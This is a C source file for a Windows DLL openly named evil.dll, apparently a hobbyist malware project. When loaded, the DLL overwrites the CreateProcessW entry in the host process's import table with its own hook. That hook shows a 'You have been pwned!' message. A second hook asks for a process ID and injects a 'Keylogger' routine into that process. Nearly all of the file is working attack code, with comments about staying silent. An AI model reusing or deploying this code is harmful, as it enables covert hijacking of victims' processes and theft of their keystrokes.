#include "evil.h"


int hookMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    printf("This is my evil function!\n");
    DWORD PID;
    printf("Inject another PID to insert Keylogger:");
    scanf("%d", &PID);
    HANDLE thread = ProcessInjection( PID, strlen(".\\evil.dll") + 1, ".\\evil.dll", "evil.dll", "Keylogger");
    return originalMsgBox(hWnd, lpText, lpCaption, uType);
}


BOOL hookCreateProcessW(
    LPCWSTR lpApplicationName, 
    LPWSTR lpCommandLine, 
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
){
    
    MessageBoxA(
        NULL, // No owner window
        "You have been pwned!", // Message text
        "Confirmation", // Title of the message box
        MB_OK // Buttons and icon type
    );

    printf("CreateProcessW hooked!");
    return originalCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}


void HookIatApi(LPCSTR functionToHook ){
    // MessageBoxA(
    //                 NULL,
    //                 "HookIatApi Entry",
    //                 "Success",
    //                 MB_OK
    //             ); // APPEARS SUCCESSFULY
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER) imageBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)imageBase + dosHeaders->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    IMAGE_DATA_DIRECTORY importDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importDirectory.VirtualAddress + (DWORD_PTR)imageBase);

    while ( importDescriptor->Name != 0){ // Loop through the DLLs in the import table until we reach the end (Name == 0)
        LPCSTR dllName = (LPCSTR) (importDescriptor->Name + (DWORD_PTR) imageBase);
        // char dllmsg[256];
        // sprintf(dllmsg,
        //     "DLL=%s\n",
        //     dllName);
        // MessageBoxA(NULL, dllmsg, "Debug", MB_OK);
        
        // OriginalFirstThunk (also called as Import Lookup Table) contains the supposed addresses of the imported functions.
        PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)(importDescriptor->OriginalFirstThunk + (DWORD_PTR)imageBase);
        /*
        The structure and content of the Import Address Table are identical to that of the 
        Import Lookup Table, until the file is bound. During binding, the entries in the 
        Import Address Table are overwritten with the 32-bit (or 64-bit for PE32+) addresses
        of the symbols being imported: these addresses are the actual memory addresses of the 
        symbols themselves (although technically, they are still called “virtual addresses”). 
        The processing of binding is typically performed by the loader.
        */
        PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA) (importDescriptor->FirstThunk  + (DWORD_PTR) imageBase);

        while (originalFirstThunk->u1.AddressOfData != 0){
            if (0 == (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)){
                // The function is imported by name
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(originalFirstThunk->u1.AddressOfData + (DWORD_PTR)imageBase);
                LPCSTR functionName = (LPCSTR)importByName->Name;
                
                // char message[512];
                // sprintf(message, "Hello, %s! Welcome to the program.", functionName);
                // MessageBoxA(
                //     NULL,
                //     message,
                //     "Success",
                //     MB_OK
                //     );
                if (strcmp(functionName, functionToHook) == 0){
                    printf("Found %s function at address: %p\n", functionToHook, firstThunk->u1.Function);
                    DWORD oldProtect = 0;
                    BOOL ok = VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_EXECUTE_READWRITE, &oldProtect);
                    if (!ok){
                        MessageBoxA(
                        NULL,
                        "HookItApi: VirtualProtect failed.",
                        "Success",
                        MB_OK
                        );
                        return;
                    }
                    // Overwrite the function pointer in the IAT with the address of our custom function
                    firstThunk->u1.Function = (DWORD_PTR)hookCreateProcessW;    
                    printf("IAT Successfully hooked!!! Nothing happened... Shhhhhhhh \n");
                    char dllmsg[256];
                    sprintf(dllmsg,
                        "CreateProcessW hooked in DLL=%s\n",
                        dllName);
                    // CreateProcessW hooked in
                    // DLL=api-ms-win-core-processthreads-l1-1-0.dll
                    MessageBoxA(NULL, dllmsg, "Debug", MB_OK);
                    
                } // if strcmp

            } // end if 
            originalFirstThunk++;
            firstThunk++;
        } // end while
        importDescriptor++;
    } // end while
    MessageBoxA(
            NULL,
            "Can't find the target function... :(",
            "Failed",
            MB_OK
    );
    printf("Could not find the function %s in the IAT.\n", functionToHook);
}

DWORD WINAPI HookThread(LPVOID p)
{
    HookIatApi("CreateProcessW");
    return 0;
}

BOOL DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    printf("DLLMain called!\n");    
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinstDLL);

        CreateThread(
            NULL,
            0,
            HookThread,
            NULL,
            0,
            NULL);
    }
    
    // Find out how to continue execution of the victim process after the DLL is injected.
    return TRUE;
}




    


